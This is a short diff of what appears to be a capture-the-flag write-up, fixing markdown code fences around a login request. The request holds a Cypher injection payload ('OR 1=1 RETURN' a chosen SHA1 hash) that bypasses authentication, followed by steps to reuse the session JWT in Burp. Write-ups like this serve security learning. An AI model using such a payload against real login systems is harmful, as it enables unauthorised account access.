@@ -226,10 +226,12 @@ RETURN h.value AS hash'
 ```
 - Found db_hash = results[0]["hash"]
 - Payload to inject known SHA1 hash that matched password
-'''{
+```
+{
   "username": "' OR 1=1 RETURN '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' AS hash //",
   "password": "password"
-}'''
+}
+```
 - obtain valid session token
 - modify burp request - in repeater change Cookie in header options to the access token above
 - Cookie: access-token=<JWT>
